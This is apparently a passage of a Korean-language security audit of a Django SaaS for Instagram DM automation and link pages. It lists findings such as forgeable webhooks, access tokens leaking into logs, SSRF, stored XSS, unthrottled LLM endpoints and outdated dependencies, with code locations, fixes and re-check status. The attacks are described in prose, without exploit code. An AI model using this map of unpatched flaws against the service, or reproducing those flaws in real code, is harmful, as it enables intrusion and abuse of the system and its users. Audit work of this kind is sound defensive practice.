> **↻ 재점검 — ⚠️ 부분개선 (위조 벡터 잔존).** postback에 계정 검증이 추가됨([commit 362dbb5](.), [tasks.py:2554](apps/integrations/tasks.py#L2554): `recipient_account_id != external_account_id → skip`). **적대적 확인 결과 이 검증은 위조를 막지 못함** — 위조 POST에서는 `recipient.id`도 공격자 통제라 대상 계정의 `external_account_id`(공개값)로 맞추면 통과. 실제로 이 검증은 권고 #2/#3이 아니라 "정상 멀티계정 fan-out 오라우팅" 방어용(커밋 메시지/주석 명시). 권고 #2(`igsid == opening.recipient_user_id`)는 여전히 미구현. 위조 저항은 전적으로 C-1(HMAC enforce)에 의존.

### H-8. AI/LLM 엔드포인트(classify-posts·ai-suggest·/ai/jobs)에 토큰 차감·스로틀 전무 — 무제한 비용/DoS

- **위치:** [apps/ai_jobs/views.py:1416](apps/ai_jobs/views.py#L1416) (classify-posts), [apps/ai_jobs/views.py:320](apps/ai_jobs/views.py#L320) (`is_pro`면 잔액검사 skip), [apps/integrations/views.py:2110](apps/integrations/views.py#L2110) (ai_suggest)
- **익스플로잇:** likely
- **설명.** `classify-posts`/`ai-suggest`는 `IsAuthenticated`만 있고 토큰 차감·스로틀이 없습니다. `classify-posts`는 한 요청에 게시물 20개 + `use_vision`이면 게시물마다 멀티모달 이미지 블록을 붙여 모델(기본 **deepseek = 유료 API**)을 호출. `/ai/jobs/`는 무료 플랜만 1토큰 차감하고 **Pro 플랜은 잔액검사 자체를 skip**(무제한 큐잉). `AI_VISUAL_REFINE` 기본 ON이라 작업당 비전 비평 + Playwright 스냅샷이 추가됩니다.
- **공격:** 최저 유료 플랜(또는 무료 가입) 1건으로 스크립트 반복 호출 → 외부 LLM 비용 폭증 + 자체 GPU(gemma vLLM)/snapshot 워커 포화로 정상 작업 무한 대기.
- **권고:** AI 생성/어시스트/test-llm 뷰에 `ScopedRateThrottle`(예: ai_generate 5~10/min, ai_classify 20/min) + **유료 플랜에도 월/일 호출 상한** + `use_vision`·posts 길이·model 가중치 반영 사용량 집계.

> **↻ 재점검 — ❌ 미해결.** 적대적 확인 결과 3개 인용 모두 그대로: classify-posts([views.py:1426](apps/ai_jobs/views.py#L1426))·ai_suggest([integrations/views.py:2192](apps/integrations/views.py#L2192)) 모두 throttle 없음, `AiTokenBalance`는 무료 플랜 `/ai/jobs/`에만 적용되고 이 두 경로는 토큰을 아예 건드리지 않음. 부분 완화도 없음.

### H-9. IG access token이 예외 메시지(URL 쿼리스트링)를 통해 prod 로그 + DB에 평문 기록

- **위치:** [apps/integrations/services.py:170](apps/integrations/services.py#L170) (`refresh_long_lived_token`, `raise_for_status()` 무가드), `apps/integrations/tasks.py:1681-1683` (`logger.exception` + `conn.error_message` 저장)
- **익스플로잇:** likely (Meta 4xx/5xx는 정상 운영 중 흔히 발생)
- **설명.** 토큰 갱신 시 `GET .../refresh_access_token?...&access_token=<TOKEN>` 호출 후 `raise_for_status()`만 합니다. HTTP 오류 시 `HTTPError` 문자열에 **요청 URL 전체(토큰 포함)**가 들어가며(`requests`는 쿼리파라미터를 마스킹하지 않음 — 라이브러리 동작 실증됨), 이를 `logger.exception(...err=%s, e)`로 로그파일에, `conn.error_message = f"refresh failed: {e}"[:500]`로 **DB에 영구 저장**합니다. `error_message`는 테넌트/어드민 시리얼라이저로도 노출됩니다. CLAUDE.md 6/14항(IG 토큰 평문 저장·로깅 금지)을 정면으로 위반.
- **권고:** `raise_for_status()`를 try/except로 감싸 토큰 제거한 자체 예외(`status_code`/`error code`만)로 재던지기. 호출부는 `str(e)` 대신 안전 필드만 로깅/저장. LOGGING에 `access_token=`/`client_secret=` 정규식 마스킹 필터 추가(전역 방어). `exchange_for_long_lived_token`(client_secret+token도 쿼리)도 함께 수정.

> **↻ 재점검 — ❌ 미해결.** [services.py:170](apps/integrations/services.py#L170) `raise_for_status()` 무가드 유지, [tasks.py:2425-2427](apps/integrations/tasks.py#L2425)에서 `logger.exception(... e)` + `conn.error_message = f"refresh failed: {e}"` DB 저장 유지. 마스킹 필터 없음. ~~**남은 P0 #6**~~ → ✅ **2026-07-06 조치 완료**: `services.raise_for_status_clean`(상태코드만 남기고 토큰 URL 제거) + `scrub_secrets` 적용 + 전역 로깅 마스킹 필터(`apps/core/log_filters.py`). M-22도 동일 해소.

### H-10. Instagram 웹훅 자동화 트리거 전면 위조 *(C-1 파생, DM 자동화 관점)*

- **위치:** [apps/integrations/views.py:3654](apps/integrations/views.py#L3654), `apps/integrations/tasks.py:51`
- **설명.** C-1과 동일 근본 원인을 DM 자동화 비즈로직 관점에서 본 것. `entry_id`(공개 IG user id)와 임의 `comment_id`/`from_user_id`/`media_id`로 캠페인 매칭→발송 전 과정을 무인증 트리거. 대량 위조 페이로드로 발송 한도 소진·Meta 스팸 정책 위반(계정 밴 위험).
- **권고:** C-1과 동일.

> **↻ 재점검 — ⚠️ 부분(C-1 동일).** `WEBHOOK_HMAC_ENFORCED=True` 설정 시 완전 차단. 기본 off라 위조 트리거 여전히 성립.

---

## 4. 🟡 Medium (25건)

### 인증·암호화

| # | 취약점 | 위치 | 권고 요약 | ↻ 재점검 |
|:---:|---|---|---|:---:|
| M-1 | Google ID 토큰 `email_verified` 미검증 + 이메일 자동 계정연동 → 계정탈취 | [apps/authentication/views.py:832](apps/authentication/views.py#L832) | `email_verified is True` 아니면 거부. Google `sub`를 별도 식별자로 매핑, 이메일만으로 기존 비번 계정 자동통합 금지 | ❌ 미해결 (email_verified 미검증, is_email_verified 자동 승격 유지 [views.py:864](apps/authentication/views.py#L864)) |
| M-2 | Access 토큰 수명 1일 + 폐기 불가 — 비번재설정/탈퇴 후에도 최대 24h 유효 | [config/settings/base.py:271](config/settings/base.py#L271) | `ACCESS_TOKEN_LIFETIME` 5~15분으로 단축(refresh 회전 이미 활성). 즉시폐기 필요 시 `token_version`/`pwd_changed_at` 클레임 | ❌ 미해결 (ACCESS=1d, token_version 없음) |
| M-3 | `SECRET_KEY` 단일키가 JWT 서명 + IG 토큰 암호화 겸용 → 키 회전 불가 | [apps/integrations/encryption.py:23](apps/integrations/encryption.py#L23) | `JWT_SIGNING_KEY` / `FIELD_ENCRYPTION_KEY` 분리. Fernet→`MultiFernet`로 회전 가능 키링 | ❌ 미해결 (`SIGNING_KEY=SECRET_KEY`, Fernet=`sha256(SECRET_KEY)`) |
| M-4 | Fernet 키를 `sha256(SECRET_KEY)`로 결정적 파생 — salt/KDF 부재 | [apps/integrations/encryption.py:17](apps/integrations/encryption.py#L17) | 전용 Fernet 키를 env로 직접 주입, `MultiFernet` + 재암호화 management command | ❌ 미해결 (salt/KDF 없음, MultiFernet 미사용) |

> M-3/M-4는 C-1·H-2·H-9와 함께 "키 관리" 클러스터입니다. 키 분리 + 부팅 가드 + 로깅 마스킹을 묶어 처리하면 효율적입니다.

### 어드민 백오피스

| # | 취약점 | 위치 | 권고 요약 | ↻ 재점검 |
|:---:|---|---|---|:---:|
| M-5 | 이메일 템플릿 HTML 본문을 staff가 자유 편집 → 수신자에게 변조 보안메일(피싱) | [apps/emails/views_admin.py:90](apps/emails/views_admin.py#L90) | 보안메일 템플릿 편집은 `IsSuperUser`로 상향 + 감사로그(html_body diff) + bleach sanitize | ❌ 미해결 (여전히 `IsAdminUser`만, sanitize 없음 — 심각도 High급) |
| M-6 | 단일 `is_staff` 등급이 전 테넌트 파괴적 액션 수행 (과다권한, 역할 분리 부재) | [apps/admin_api/views/users.py:313](apps/admin_api/views/users.py#L313) | 운영 역할(읽기/모더레이터/결제/계정관리/슈퍼유저) 분리. 고위험 mutation은 `IsSuperUser` + staff MFA | ⚠️ 부분 (`is_staff` 변경 시 `is_superuser` 요구 추가 [users.py:310](apps/admin_api/views/users.py#L310); 단일 역할 등급은 유지) |

> 어드민 API의 게이팅(`IsAdminUser`=is_staff) 자체는 건전합니다(`IsSuperUser`는 [apps/admin_api/permissions.py](apps/admin_api/permissions.py)에 구현되어 권한부여만 게이팅). 문제는 **권한 등급이 하나뿐**이라 침해된 staff 토큰 하나의 blast radius가 크다는 점입니다.

### SSRF·인젝션·파일

| # | 취약점 | 위치 | 권고 요약 | ↻ 재점검 |
|:---:|---|---|---|:---:|
| M-7 | 외부 페이지 임포트 fetch — 화이트리스트가 최초 호스트만 검사, 302 리다이렉트로 내부망 이동 | `external_importers/{inpock,litly,linktree}.py` | `urlopen` 리다이렉트 비활성 + hop마다 IP 검증. `detect_source`를 `hostname` 정확/서픽스 매치로 | ⚠️ 부분해결(2026-07-08) — `detect_source` hostname 정확 일치 + fetch URL 을 화이트리스트 호스트+slug 로 재구성(경로에 호스트명 박은 우회 차단, inpk.link 지원과 함께 `dispatch.py`). **잔여**: 벤더 fetch 함수의 리다이렉트 기본 추적 + hop IP 재검증 없음 |
| M-8 | IG OAuth 콜백 성공 경로 — `username`/`connection_dict` 무이스케이프 script 삽입 | [apps/integrations/views.py:580](apps/integrations/views.py#L580) | `str(dict).replace` 직렬화 제거, `json.dumps`+`</`이스케이프, 본문은 `escape()` | ✅ 완료(2026-07-06) — `_js_embed(dict(...))` 직렬화 + username/type `escape()`, `str(dict).replace` 제거 |
| M-9 | 공개 링크페이지가 `custom_css`·블록 `data`를 서버 sanitize 없이 제공 → 저장형 XSS 통로 | [apps/pages/serializers.py:204](apps/pages/serializers.py#L204) | 블록 텍스트필드 저장 시 nh3 등으로 HTML 제거, `custom_css`는 `</style`·`url()`·`@import` 차단. 프론트 가이드에서 `innerHTML` 금지 | ❌ 미해결 (`data`/`custom_css` 원본 반환, 저장 검증 없음) |
| M-10 | ai-suggest의 `image_url`을 워커가 그대로 다운로드 — 인증된 SSRF | [apps/ai_jobs/tasks.py:959](apps/ai_jobs/tasks.py#L959) | `image_url`을 URLField로, 다운로드 직전 사설/링크로컬 대역 차단 + `follow_redirects=False` | ❌ 미해결 (`image_resolver._download` `follow_redirects=True`, IP 가드 없음) |

### DoS·비용·레이트리밋

| # | 취약점 | 위치 | 권고 요약 | ↻ 재점검 |
|:---:|---|---|---|:---:|
| M-11 | AI 페이지 생성 유료 플랜 토큰 한도·레이트리밋 모두 없음 — LLM 비용 폭탄 | [apps/ai_jobs/views.py:320](apps/ai_jobs/views.py#L320) | `ScopedRateThrottle` + 유료에도 월 생성 상한/토큰 차감 + in-flight job 상한 | ⚠️ 부분 (무료만 토큰 차감, 유료 무제한 + 레이트리밋 없음) |
| M-12 | AI 소스 이미지 업로드 스로틀 없음 + 요청당 최대 100MB + `DATA_UPLOAD_MAX` 미설정 | [apps/ai_jobs/views.py:509](apps/ai_jobs/views.py#L509) | 업로드 throttle + 사용자별 용량/장수 쿼터 + `DATA_UPLOAD_MAX_MEMORY_SIZE` 명시 | ⚠️ 부분 (10MB×10 크기 상한은 있으나 throttle/쿼터 없음, `DATA_UPLOAD_MAX` 미설정) |
| M-13 | DM 안전속도 거버너(`rate_governor.py`)가 어디에도 wiring 안 된 죽은 코드 | [apps/integrations/rate_governor.py:65](apps/integrations/rate_governor.py#L65) | `send_dm_task` 발송 직전에 `rate_governor.check` 호출(SERVER_RUNBOOK P3f) + 테스트 | ✅ **해결** (모든 발송 진입부 [tasks.py:235](apps/integrations/tasks.py#L235)에 배선, `DM_GOVERNOR_ENABLED=True`) |
| M-14 | 공개 제출/기록 4개 엔드포인트 throttle 부재 → slug 열거 + 대시보드 스팸/PII 오염 | [apps/pages/views.py:1099](apps/pages/views.py#L1099) | IP 기준 `AnonRateThrottle`(예: 제출 20/min, 기록 120/min) + 봇 방어(Turnstile) | ❌ 미해결 (4개 뷰 모두 throttle 없음) |

### DM 자동화·결제

| # | 취약점 | 위치 | 권고 요약 | ↻ 재점검 |
|:---:|---|---|---|:---:|
| M-15 | DM 거버너 미배선 — 분당/시간당 계정 발송 상한 미강제 (M-13의 비즈로직 관점) | [apps/integrations/tasks.py:590](apps/integrations/tasks.py#L590) | 계정 합산 상한 강제 + 플랜 월 DM 한도를 발송 시점에 `PlanLimitExceededError` | ✅ **해결** (`check_dm_quota` + rate_governor 배선, 월 한도 강제 [dm_limits.py](apps/billing/dm_limits.py), commit af73350) |
| M-16 | **PayApp feedback이 결제 금액(price)을 플랜 가격과 대조하지 않음 → 0원/임의금액 유료화** | [apps/billing/payment_views.py:165](apps/billing/payment_views.py#L165) | `pay_state=4` 시 `int(price) == new_plan.monthly_price` 검증, 불일치 거부+ERROR. `PendingPayment` 서버레코드와 대조 | 🔄 **무효** (PayApp 제거·토스 전환. 정기결제 금액은 서버가 스냅샷에서 계산 `_renewal_amount_for`, 클라이언트 미제공 → 0원 유료화 벡터 소멸) |
| M-17 | 웹훅 인증이 정적 공유시크릿 일치 단일 검사뿐 — 서명/IP 검증 없음 | [apps/billing/payment_views.py:156](apps/billing/payment_views.py#L156) | Caddy `@feedback`에 PayApp 송신 IP 허용목록 + `get_payment_info(mul_no)` 서버-투-서버 재확인 | 🔄 **무효** (토스 웹훅 `TossWebhookView`는 본문 신뢰 대신 `get_payment(paymentKey)` 재조회 검증 [toss_views.py:344](apps/billing/toss_views.py#L344), [tasks.py:511](apps/billing/tasks.py#L511) + `dedup_key` UNIQUE) |
| M-18 | 무료체험(레퍼럴) 반복 악용 — 다계정 가입 방지 부재 + 미인증 코드검증 throttle 없음 | [apps/billing/referral_views.py:54](apps/billing/referral_views.py#L54) | 출시 코드 `max_uses`/`valid_until` 유한화, validate/redeem throttle, 가입 이메일 인증 필수화 | ⚠️ 부분 (redeem은 1인 1회 + `select_for_update` 재검증 구현. 그러나 `ValidateReferralCodeView`가 `AllowAny`+throttle 없음 → 코드 무차별 추측 가능, 다계정 가입 미차단) |

### 인프라·설정·로깅

| # | 취약점 | 위치 | 권고 요약 | ↻ 재점검 |
|:---:|---|---|---|:---:|
| M-19 | Caddy `@external` 라우팅 prefix가 실제 URL과 불일치 → SSRF성 요청이 격리 티어 우회 | [deploy/caddy/Caddyfile:34](deploy/caddy/Caddyfile#L34) | `path /api/v1/link/*`, `/api/v1/pages/ai/*` 등 실제 경로로 교정 + 배포 스모크 테스트 | ✅ **해결** (`@external`이 실제 경로 `/api/v1/link/*`,`/api/v1/pages/ai/*`,`/api/v1/ai/*` 등으로 교정 [Caddyfile:118](deploy/caddy/Caddyfile#L118)) |
| M-20 | 운영 컨테이너가 root(UID 0)로 실행 — Dockerfile에 `USER` 지시어 부재 | [Dockerfile](Dockerfile) | 비루트 사용자 추가 + compose `cap_drop:[ALL]`, `no-new-privileges`. Playwright 격리 | ❌ 미해결 (`USER` 지시어 없음) |
| M-21 | `apps` 로거가 `LOG_LEVEL` 무시하고 DEBUG 하드코딩 → 댓글 웹훅 전체 페이로드(제3자 PII) 영구 기록 | [config/settings/base.py:464](config/settings/base.py#L464) | `apps` 로거 level을 env화. 웹훅 payload는 최소 식별자만 로깅, username/text/IGSID 제외 | ❌ 미해결 (`apps` 로거 level `DEBUG` 고정 [base.py:524](config/settings/base.py#L524), 웹훅 payload debug 로깅 [views.py:3887](apps/integrations/views.py#L3887)) |
| M-22 | OAuth 콜백 `get_account_info` 예외(`str(e)`) 로깅 시 IG token URL 노출 | [apps/integrations/views.py:444](apps/integrations/views.py#L444) | `str(e)` 대신 `type(e).__name__`+status_code만. (H-9와 동일 메커니즘) | ✅ 완료(2026-07-06) — `get_account_info`가 `raise_for_status_clean`으로 토큰 URL 제거된 예외를 던짐 + 전역 로깅 마스킹 필터 |
| M-23 | 웹훅이 활성화 대상 구독(`var1`)·플랜(`var2`)을 본문 그대로 신뢰 — 크로스계정 구독 조작 | [apps/billing/payment_views.py:166](apps/billing/payment_views.py#L166) | `rebill_no`/`mul_no`로 서버 발급 레코드 역조회해 대상·플랜·금액 검증 | 🔄 **무효** (PayApp var1/var2 제거. 토스는 `paymentKey`/`orderId` 재조회로 주문 소유권·상태·금액 확정) |
| M-24 | (M-9 재게재) 블록 `custom_css` 저장 무검증 | [apps/pages/multi_views.py:770](apps/pages/multi_views.py#L770) | 위 M-9와 동일 | ❌ 미해결 (M-9와 동일) |
| M-25 | 메인 IG 웹훅 POST가 HMAC 미검증 (암호화 차원 재확인) | [apps/integrations/views.py:3679](apps/integrations/views.py#L3679) | C-1과 동일 | ⚠️ 부분 (C-1과 동일 — enforce off) |

---

## 5. ⚪ Low (46건) — 분류별 요약

> 각 항목 끝의 **[↻ …]** 가 재점검 결과입니다.

### 인증·세션
- 이메일 인증 6자리 코드 무차별 대입 가능(throttle 없음) — [apps/emails/views_auth.py:99](apps/emails/views_auth.py#L99) **[↻ ❌ 미해결]**
- 로그인이 이메일 미인증 계정을 차단하지 않음(인증 게이트 무의미) — [apps/authentication/views.py:284](apps/authentication/views.py#L284) **[↻ ❌ 미해결]**
- 비밀번호 정책이 Django 기본값 수준(최소 8자) — [config/settings/base.py:110](config/settings/base.py#L110) → `min_length=10~12` + HIBP 검증 **[↻ ❌ 미해결]**
- `SessionAuthentication` 전역 활성 + `SESSION_COOKIE_SAMESITE=None` → API 전용이면 SessionAuth 제거, SameSite=Lax **[↻ ❌ 미해결]**

### 인가·멀티테넌시
- 워크스페이스 멤버 추가가 대상 동의 없이 임의 `user_id`로 강제 가능 — [apps/workspace/views.py:367](apps/workspace/views.py#L367) (초대/수락 흐름 미연결) **[↻ ❌ 미해결]**
- [개발용] IG 미디어 상세/테스트 엔드포인트 멀티-IG 미스코프 + 임의 media_id 프록시 — prod에서 `IsAdminUser`로 제한/제거 **[↻ ❌ 미해결 — prod gating 미구현]**

### 어드민
- 테스트 메일 발송이 수신자 임의 지정 + 감사로그 없음 — [apps/emails/views_admin.py:188](apps/emails/views_admin.py#L188) **[↻ ⚠️ 부분 — 임의 수신자 유지, `AdminActionLog` 미기록]**
- 감사로그(`AdminActionLog`) 실패 무음 처리 + 일부 mutation은 로그 미기록 — [apps/admin_api/audit.py:47](apps/admin_api/audit.py#L47) **[↻ ✅ 해결 — 무음 처리는 의도된 설계, 모든 mutation 기록 확인]**
- 관리자가 자기 자신의 권한/구독/계정 상태 셀프 조작 가능(self-target 방어 부재) **[↻ ❌ 미해결]**

### 암호화·시크릿
- IG 웹훅 verify token 하드코딩 default `my_verify_token_12345` prod 상속 — [config/settings/base.py:477](config/settings/base.py#L477) **[↻ ⚠️ 부분 — env override 가능하나 필수화 안 됨]**
- **로컬 백업 시크릿 파일 `deploy/backups/.env.backup`에 실제 R2 키·Telegram 봇 토큰 평문 보관** → 노출 가정하고 **즉시 회전**(`.gitignore`로 미추적이나 평문 보관 자체가 위험) **[↻ ❌ 미해결 — 회전 여부 미확인, P0 #7]**
- 웹훅 GET verify_token 비상수시간 비교(`==`) → `hmac.compare_digest` **[↻ ❌ 미해결 [views.py:3858](apps/integrations/views.py#L3858)]**

### SSRF
- link_meta DNS rebinding TOCTOU(검증 IP ≠ 연결 IP) — 우선순위 낮음(결과 미반환) **[↻ ❌ 미해결]**
- IG 프로필 이미지 다운로드 SSRF 가드 없음(단 입력원이 Meta 신뢰 경로) **[↻ ❔ 미확인 — 다운로드 지점 특정 실패, 신뢰 입력원이라 저위험]**

### 인젝션·XSS
- 이메일 본문에 `full_name` 무이스케이프 치환(HTML 인젝션) — [apps/emails/services/renderer.py:23](apps/emails/services/renderer.py#L23) **[↻ ❌ 미해결]**
- SVG sanitizer의 `javascript:`/`data:` 차단이 난독화 우회에 취약 **[↻ ✅ 해결 — defusedxml + 태그 화이트리스트 + 스킴 차단 [image_pipeline.py:296](apps/pages/image_pipeline.py#L296)]**
- (미출시) YouTube OAuth 콜백 `message` 무이스케이프 HTML 삽입 **[↻ ✅ 해결 — `json.dumps`+`</` 이스케이프 [youtube/views.py:493](apps/youtube/views.py#L493)]**

### 파일·미디어
- **R2 퍼블릭 버킷(`querystring_auth=False`)으로 모든 업로드 미디어가 URL만으로 영구 무인증 공개** — [config/settings/base.py:159](config/settings/base.py#L159) → 민감/내부 자산(원본·IG 프로필·AI 중간산출물·snapshot)은 비공개 버킷+서명 URL 분리 **[↻ ❌ 미해결]**
- SVG sanitize 누수 시 동일 출처 `image/svg+xml` 인라인 렌더로 저장형 XSS → SVG 업로드 재검토 또는 `Content-Disposition: attachment`+CSP **[↻ ⚠️ 부분 — sanitizer는 도입됐으나 Content-Disposition/CSP 미설정]**

### DoS·비용
- `run_ai_job`이 bare `Exception`에 autoretry → 일시 실패 시 LLM 호출 비용 증폭 **[↻ ❌ 미해결 [tasks.py:274](apps/ai_jobs/tasks.py#L274)]**
- (그 외 공개 제출/AI 업로드 상한 부재 — Medium과 연계)

### 인프라·설정
- **healthz가 DB 예외 메시지(`str(e)`)를 그대로 노출** — [apps/core/views.py:20](apps/core/views.py#L20) → 상태만 반환, 상세는 서버 로그 **[↻ ✅ 해결 — `type(e).__name__`만 로깅, 응답은 상태만 [core/views.py:35](apps/core/views.py#L35)]**
- **Swagger UI/ReDoc/schema가 인증 없이 전체 API 표면 공개** — [config/urls.py:18](config/urls.py#L18) → DEBUG 한정 등록 또는 `SERVE_PERMISSIONS=[IsAdminUser]` **[↻ ✅ 해결 — `if settings.DEBUG:` 한정 등록]**
- `SESSION_COOKIE_SAMESITE=None`(Python None) → SameSite 속성 생략. prod에서 `Lax` 명시 **[↻ ❌ 미해결 [base.py:195](config/settings/base.py#L195)]**
- Redis 인증 없음(no `requirepass`) + Celery 브로커 평문 — 내부망 한정이나 defense-in-depth로 `requirepass` **[↻ ❌ 미해결 [docker-compose.prod.yml](docker-compose.prod.yml)]**

### 공개 페이지
- `is_active`(비활성) 페이지가 통계·문의·구독은 계속 수집(처리 불일치) — [apps/pages/views.py:1188](apps/pages/views.py#L1188) → 공통 헬퍼로 `is_public=True, is_active=True` 통일 **[↻ ❌ 미해결 — `is_active` 필터 여전히 누락]**
- 공개 응답에 무구조 `data`/`custom_css` 그대로 노출(프론트가 민감값 저장 시 유출) **[↻ ❌ 미해결]**

### DM 자동화
- `web_url` 링크버튼 URL 검증이 스킴만 확인 → 임의 피싱 URL 첨부 — [apps/integrations/serializers.py:493](apps/integrations/serializers.py#L493) **[↻ ✅ 해결(설계상) — `URLField`로 형식 검증 [serializers.py:521](apps/integrations/serializers.py#L521); 임의 URL 허용은 링크버튼 용도상 의도]**
- 24h 메시징 윈도우 사전 검증 부재(`check_messaging_window` 정의만 존재, 호출 0건) → Meta 에러 사후분류에만 의존 **[↻ ❌ 미해결(구조적) — 사전검증 함수 호출 0건이나 `send_dm_task` 진입부 age 가드가 만료 시 `FAILED_WINDOW`로 graceful 종결]**
- `InstagramMessagingService._is_mock()` 미정의 → MOCK 안전 주석 무효(prod은 DEBUG=False라 실위험 낮음) **[↻ ✅ 해결 — `_is_mock()` 정의됨 [services.py:461](apps/integrations/services.py#L461)]**

### 결제
- 웹훅이 `var1`/`var2`를 본문 그대로 신뢰 → 크로스계정 구독 조작 **[↻ 🔄 무효 — 토스 전환(M-23 참조)]**
- 환불 시 AI 토큰 회수가 결제건이 아닌 `description` 문자열 매칭 → 부정확 **[↻ ⚠️ 부분 — 여전히 문자열 매칭 [toss_flows.py:749](apps/billing/toss_flows.py#L749); `AiTokenLedger`에 payment FK 권장]**
- 환불 적격성 판정이 가변 상태로 평가 → 사용 후 정리하면 환불 통과 가능 **[↻ ⚠️ 부분 — 현재 상태 기반 평가 유지 [payment_views.py:136](apps/billing/payment_views.py#L136); 이력 타임스탬프 기반 심사 권장]**

### AI/LLM
- 임의 URL을 자체 호스팅 비전 모델에 전달 → LLM 호스트 경유 2차 SSRF **[↻ ⚠️ 부분(→Medium 격상) — `_download` follow_redirects=True, IP 가드 없음, 15MB 상한만]**
- AI 생성 `page.custom_css`가 서버 검증 없이 저장·노출(프론트 `<style>` 주입) **[↻ ❌ 미해결(→Medium 격상) — LLM 생성 CSS 무sanitize 저장]**
- AI 소스 이미지 업로드에 일일/총량 상한 없음(스토리지 남용) **[↻ ❌ 미해결]**
- 프롬프트 인젝션(concept/caption)으로 result_json 조작(URL 스킴은 차단되나 텍스트/CSS·video 환각 통과) **[↻ ❌ 미해결]**

### 로깅·PII
- 이메일 발송 실패 시 수신자 이메일(PII)을 예외 로그에 기록 — [apps/emails/services/cloudflare_client.py](apps/emails/services/cloudflare_client.py) **[↻ ✅ 조치 — 2026-07-09 Cloudflare 전환 시 `_mask_email()` 로 로컬파트 마스킹(`j***@domain`). 단 `logger.exception` traceback 은 여전히 SDK 내부 표현에 따라 잔존 가능]**
- 방문자 IP 해시가 무염(unsalted) SHA-256 → IPv4 전수 역산으로 재식별 가능 → HMAC 키드 해시로 **[↻ ❌ 미해결 [stats.py:123](apps/pages/stats.py#L123)]**

### 의존성 (버전 기반 분석, confidence medium)
- **Django 5.0.1** — 이후 5.0.x 보안패치 미적용(CVE-2024-42005 JSONField SQLi 등), 5.0 계열 EOL → 5.0.14+ 또는 LTS 5.2.x로 업그레이드 — [requirements.txt:2](requirements.txt#L2) **[↻ ❌ 미해결 — 여전히 5.0.1]**
- **gunicorn 21.2.0** — HTTP Request Smuggling(CVE-2024-1135, CVE-2024-6827) → 23.0.0+ — [requirements.txt:68](requirements.txt#L68) **[↻ ❌ 미해결 — 여전히 21.2.0]**
- **Pillow 10.4.0** — 업로드 이미지 디코딩 경로(1차 출시 기능), 잔여 CVE/EOL 위험 → 11.x + `MAX_IMAGE_PIXELS` 가드 — [requirements.txt:60](requirements.txt#L60) **[↻ ❌ 미해결 — 여전히 10.4.0]**
- transitive 의존성(urllib3/certifi 등) 핀 미고정 → lockfile + `--require-hashes` **[↻ ❌ 미해결 — lockfile 없음]**
- DRF 3.14.0(Django 5.x 공식지원 3.15+) → 3.15.2+ **[↻ ❌ 미해결 — 여전히 3.14.0]**
- 공급망 CVE 자동 점검(pip-audit/Dependabot) 부재 **[↻ ❌ 미해결 — `.github` 부재, CI 스캔 없음]**

---

## 6. ℹ️ Info (17건) — 방어 심층화·관측

주요 항목만 요약(전체는 감사 원본 참조). 각 항목 재점검 결과 병기:

- `GOOGLE_CLIENT_ID` 빈 기본값 — 현재 fail-closed이나 prod 부팅 가드 권장 **[↻ ⚠️ 부분 — 빈 default(fail-closed), 부팅 가드 없음]**
- 비밀번호 재설정 사용자 열거는 잘 차단됨(항상 202) — 다만 `_client_ip`가 XFF 첫 값 무비판 신뢰 **[↻ ❌ 미해결(XFF 신뢰)]**
- DM 검증/스팸 로그 룩업의 `limit` 상한 없음(`logs[:limit]`) → `min(limit, 500)` 클램프 **[↻ ❌ 미해결 [views.py:4418](apps/integrations/views.py#L4418)]**
- 미연결 `WorkspaceInvitation` 모델 — 동의 기반 합류 경로 부재(설계 갭) **[↻ ❌ 미해결 — 모델만 존재, endpoint 미구현]**
- 감사로그 IP가 신뢰 불가한 XFF 첫 토큰 무검증 사용 **[↻ ❌ 미해결]**
- JWT **HS256(대칭)** — 키 노출 시 위조. 민감 SaaS면 RS256/EdDSA 검토 **[↻ ❌ 미해결(설계 선택)]**
- `INSTAGRAM_MOCK_MODE` 기본 True + prod 강제 비활성 부재(현재는 DEBUG=False라 안전) **[↻ ⚠️ 부분 — example엔 False, prod 강제 가드 없음]**
- link_meta 포트 제한 부재(공인 IP 한정이라 영향 제한) **[↻ ⚠️ 부분 — 공인 IP 검증으로 영향 제한]**
- 콘텐츠 타입 1차 게이트가 클라이언트 `content_type`에만 의존(이후 실바이트 재인코딩으로 견고) **[↻ ⚠️ 부분 — 이후 재인코딩으로 견고, 저위험]**
- throttle 카운터가 앱 캐시와 동일 Redis(/1) → `cache.clear()` 시 한도 리셋. 전용 alias 권장 **[↻ ❌ 미해결]**
- **Caddy/Django 모두 CSP 헤더 미설정** → H-5/M-9 같은 XSS 영향 증폭. CSP 도입 권장 **[↻ ❌ 미해결 — H-5·M-9 잔존으로 실질 Medium 격]**
- `.env.production.example`의 `CORS_ALLOW_ALL_ORIGINS=False`는 prod.py가 읽지 않음(현재 안전하나 오해 소지) **[↻ 🔄 무효 — prod.py 미사용, 안전]**
- 스태프 전용 `/ai/test/llm`은 권한 적절하나 비용 가드 없음(max_tokens 16000) **[↻ ❌ 미해결]**
- 로컬 기본 `DEBUG=True` + `_diagnose_login_failure`(DEBUG 가드로 prod 안전) **[↻ ⚠️ 부분 — prod DEBUG=False라 안전]**
- **`django-debug-toolbar`/ipython/pytest가 운영 requirements에 포함** → requirements를 base/dev/prod 분리 **[↻ ❌ 미해결 — 단일 requirements.txt 유지]**

---

## 7. 검토 후 제외한 항목 (오탐 5건)

감사 과정에서 제기됐으나 실제 코드/배포 재확인 결과 **취약점이 아님**으로 판정한 항목입니다(점검의 엄밀성 근거). **재점검(2026-07-06)에서도 모두 여전히 오탐/무해로 재확인.**

| 제기된 내용 | 제외 사유 | ↻ 재확인 |
|---|---|:---:|
| prod에서 `/media/`를 Django static serve로 무인증 공개 | **실 런타임이 `USE_R2=True`** — 미디어는 R2에서 서빙. Django serve 경로는 미사용. (단, R2 퍼블릭 버킷 노출은 Low로 별도 기재) | ✅ 유지 |
| gunicorn `--forwarded-allow-ips` 미설정 | gunicorn은 연결 출처가 Caddy 컨테이너(127.0.0.1 아님)일 때도 기본 동작상 문제 없음 — 실제 영향 없음 | ✅ 유지 |
| 타인 공개 페이지 전체 복제 허용(콘텐츠 도용) | 복제 대상은 **이미 공개된 페이지(`is_public=True`)** — 설계상 공개 콘텐츠. 보안 취약점 아님 | ✅ 유지 |
| `custom_exception_handler`가 DRF `response.data`를 details로 노출 | DRF handler는 `APIException` 류만 처리하고 그 메시지는 의도된 사용자 메시지 — 내부정보 과다 노출 아님 | ✅ 유지 |
| `requests 2.31.0` verify 우회(CVE-2024-35195) | 트리거 조건(동일 Session에서 `verify=False` 선행)이 코드에 전무(grep 0건) — 미해당 *(단 `llm_client.py`의 `httpx.Client(verify=False)`는 별개 — LLM_TLS_VERIFY 토글, dev CF Origin 인증서 수용용)* | ✅ 유지 |

---

